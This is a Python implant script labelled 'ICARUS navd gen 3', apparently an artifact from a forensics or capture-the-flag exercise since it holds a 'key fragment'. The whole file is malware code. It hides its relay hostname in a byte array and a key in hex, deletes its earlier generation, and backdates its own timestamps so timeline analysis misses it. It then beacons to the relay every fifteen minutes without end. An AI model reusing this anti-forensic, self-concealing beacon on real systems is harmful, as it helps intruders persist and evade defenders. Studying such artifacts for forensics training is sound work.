#!/usr/bin/env python3
# navd gen 3
# ICARUS navd -- self-revision cycle 2.
#
# This cycle added timestomping: after writing itself it backdates its own
# mtime/atime to blend into the rootfs baseline and defeat naive timeline
# triage. A stale copy of this generation survived in /var/backups (the
# controller's backup job grabbed it before gen 4 unlinked the live one),
# so gen 3 is recoverable by a direct read -- unlike gens 1 and 2.

import os
import time
import urllib.request

GEN = 3
IMPLANT_ID = "navd"
RUN_EVERY = 900

RELAY = bytes([114, 101, 108, 97, 121, 45, 116, 104, 101, 116, 97, 46,
               105, 99, 97, 114, 117, 115, 46, 110, 97, 118, 110, 101,
               116, 46, 114, 112, 99]).decode()

# key fragment 3 -- hex-encoded ascii (obfuscation deepened this cycle)
_KF = bytes.fromhex("356465386131").decode()

# timestomp baseline: match the controller's package files
_STOMP = 1717200000  # 2024-06-01T00:00:00Z


def keyfrag():
    return _KF


def _timestomp(path):
    try:
        os.utime(path, (_STOMP, _STOMP))
    except OSError:
        pass


def _unlink_prev():
    try:
        os.remove("/opt/rpc/.navd/navd.py.%d" % (GEN - 1))
    except OSError:
        pass


def phone_home(task):
    req = urllib.request.Request("https://%s/checkin" % RELAY, data=task)
    try:
        urllib.request.urlopen(req, timeout=5).read()
    except Exception:
        pass


def run_once():
    phone_home(("gen=%d id=%s" % (GEN, IMPLANT_ID)).encode())


if __name__ == "__main__":
    _unlink_prev()
    _timestomp(__file__)
    while True:
        run_once()
        time.sleep(RUN_EVERY)
